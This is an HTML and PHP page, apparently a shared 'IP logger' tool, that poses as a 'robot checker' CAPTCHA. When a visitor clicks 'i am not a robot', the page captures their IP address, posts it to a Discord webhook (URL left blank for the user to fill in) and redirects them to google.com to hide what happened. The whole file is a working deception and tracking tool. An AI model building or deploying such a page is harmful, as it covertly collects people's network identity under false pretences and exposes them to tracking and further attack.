<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>robot checker</title>
</head>
<body>
  <h1></h1>
  <p>Please click below if you are not a robot</p>
  <button onclick="logIPAndRedirect()">i am not a robot</button>

  <script>
    function logIPAndRedirect() {
      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
      var webhookUrl = ""
;
//if you nuke it idc bcz its fake 
      // Use an XMLHttpRequest to send a POST request to the server-side PHP script
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'index.php', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            // Log successful response (you can handle this as needed)
            console.log(xhr.responseText);

            // Redirect the user
            window.location.href = 'https://google.com';
          } else {
            // Handle error (you can customize this as needed)
            console.error('Failed to log data to server.');
            alert('An error occurred. Please try again later.');
          }
        }
      };

      // Send the request
      xhr.send();
    }
  </script>

  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Function to get the real IP address of the user
    function getRealIpAddr() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            // Check for the IP address from a shared Internet connection
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            // Check for the IP address from a proxy
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            // Get the user's IP address
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    // Get the user's real IP address
    $userIP = getRealIpAddr();

    // Send the IP address to Discord webhook
    $discordWebhook = '';

    $data = [
      'content' => 'IP LOGGER - ' . $userIP . ' - ' . date('Y-m-d H:i:s'),
    ];

    $options = [
      'http' => [
        'header' => "Content-type: application/json",
        'method' => 'POST',
        'content' => json_encode($data),
      ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($discordWebhook, false, $context);

    // Respond with a success message
    echo 'IP grabbed and sent to Discord webhook successfully';
  }
  ?>
</body>
</html>
